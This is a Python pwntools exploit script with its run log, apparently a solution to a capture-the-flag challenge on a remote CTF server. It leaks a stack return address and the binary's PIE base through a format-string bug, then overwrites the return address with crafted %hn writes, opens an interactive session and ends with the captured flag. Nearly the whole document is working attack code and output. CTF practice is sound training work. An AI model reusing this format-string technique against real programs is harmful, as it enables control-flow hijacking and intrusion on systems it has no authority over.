#!/urs/bin/env python
from pwn import *

local = False
debug = False

context.terminal = ['xfce4-terminal', '-e']

p = process('./exploiting3') if local else remote('retos.ddom.me', 4089)

p.sendlineafter('Name:', 'dialluvioso')
p.sendlineafter('Class:', 'pwn')
p.sendlineafter('Str:', '0')
p.sendlineafter('Dex:', '1')
p.sendlineafter('?', '0')

def exploitFormat(payload):
	p.sendlineafter('Exit', 'd')
	p.sendlineafter('?', '{}'.format(payload))

log.info('Leaking RET')
exploitFormat('%{}$p'.format(6))
ret = int(p.recvuntil('Main').split()[4], 16) + 4

log.success('Ret @ {:#x}'.format(ret))

log.info('Leaking PIE')
exploitFormat('%35$p')
base = int(p.recvuntil('Main').split()[4], 16) - 0x10b0

log.success('Binary base @ {:#x}'.format(base))

addr = base + 0x1123

pld  = ''
pld += p32(ret)
pld += p32(ret + 2)
pld += '%{}d%8$hn'.format((addr >> 0x10) - 0x8)
pld += '%{}d%7$hn'.format((addr & 0xffff) - (addr >> 0x10))

if debug:
	gdb.attach(p, '''
	b *secret_quiz+207
	c
	''')


exploitFormat(pld)

p.interactive()

"""
[+] Opening connection to retos.ddom.me on port 4089: Done
[*] Leaking RET
[+] Ret @ 0xffce298c
[*] Leaking PIE
[+] Binary base @ 0x565d6000
[*] Switching to interactive mode
...
             -143145568
flag{9016a242931bd9952b8b860a639c4a3d}
"""
